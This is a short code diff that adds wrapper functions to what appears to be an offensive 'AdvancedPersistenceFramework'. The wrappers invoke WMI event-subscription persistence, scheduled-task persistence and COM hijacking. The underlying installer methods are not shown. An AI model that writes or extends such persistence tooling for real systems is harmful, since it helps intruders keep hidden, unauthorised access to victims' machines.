@@ -258,6 +258,30 @@ class AdvancedPersistenceFramework:
         return stealth_config
 
 
+def wmi_persistence() -> Dict[str, Any]:
+    """Provide WMI persistence configuration for legacy callers."""
+    framework = AdvancedPersistenceFramework()
+    details = framework._install_wmi_persistence()
+    print(f"[wmi_persistence] Installing filter {details['filter_name']} with consumer {details['consumer_name']}")
+    return details
+
+
+def scheduled_task_persistence() -> Dict[str, Any]:
+    """Provide scheduled task persistence configuration for legacy callers."""
+    framework = AdvancedPersistenceFramework()
+    details = framework._install_scheduled_task_persistence()
+    print(f"[scheduled_task_persistence] Creating task {details['task_name']} for persistence")
+    return details
+
+
+def com_hijacking() -> Dict[str, Any]:
+    """Provide COM hijacking persistence configuration for legacy callers."""
+    framework = AdvancedPersistenceFramework()
+    details = framework._install_com_hijacking()
+    print(f"[com_hijacking] Targeting CLSID {details['target_clsid']} for hijack")
+    return details
+
+
 class FilelessPersistence:
     """Fileless persistence techniques using memory-only approaches."""
     
